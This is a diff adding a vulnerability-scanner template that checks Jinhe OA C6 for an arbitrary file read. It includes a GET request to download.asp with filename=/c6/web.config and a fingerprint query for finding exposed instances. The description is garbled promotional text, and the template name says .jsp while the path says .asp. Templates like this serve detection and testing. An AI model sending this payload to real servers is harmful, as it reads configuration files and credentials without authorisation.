@@ -1,0 +1,21 @@
+name: JinHe OA C6 download.jsp Arbitrary fileread
+manual: true
+query: app="Jinher-OA"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"xml")
+expression: r0()
+detail:
+  description: 'Jinhe OA C6 collaborative management platform is based on the \"precise
+    management thought\" as the soul, around the \"four-level theory of enterprise
+    collaboration\" as the model, and firmly grasps the six core elements of modern
+    enterprise management: culture, communication, collaboration Collaboration, Innovation
+    Creation, Control Control, and Center Center have built a structured, flexible
+    integration, dynamic response, and intelligent collaborative application management
+    platform for enterprise operation management.'
+  tags: fileread
